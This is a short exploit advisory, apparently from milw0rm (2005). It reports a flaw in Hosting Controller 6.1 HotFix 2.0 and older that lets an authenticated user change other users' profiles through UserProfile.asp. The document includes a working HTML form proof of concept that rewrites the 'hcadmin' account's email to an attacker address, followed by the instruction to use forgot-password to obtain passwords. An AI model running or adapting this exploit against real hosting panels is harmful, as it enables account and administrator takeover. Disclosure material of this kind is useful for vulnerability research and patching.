<!--

Hi, I'm Soroush Dalili from GSG (GrayHatz Security Group).

Title: Hosting controller program have a security bug
in "UserProfile.asp" that an authenticated user can
change other's profiles.
Why is it dangerous: a user can change other's email
address and then use forgot password to recieve their
password! also he/she can gain administrator password
by this way!
Version: 6.1 HotFix 2.0 and older
Developer url: hostingcontroller.com
Comment: Hosting Controller is an application to
manage a host.

Exploit code to proof:
--------------------------------
Change users profiles: --> 



<form action="http://[URL]/admin//accounts/UserProfile.asp?action=updateprofile" method="post">
Username : <input name="UserList" value="hcadmin" type="text" size="50">
<br>
emailaddress : <input name="emailaddress" value="Crkchat@msn.com" type="text" size="50">
<br>
firstname : <input name="firstname" value="Crkchat" type="text" size="50">
<br>
<input name="submit" value="submit" type="submit">
</form>

<!--
-----------------------------------
Now u can use forgot password to gain passwords! -->

# milw0rm.com [2005-05-27]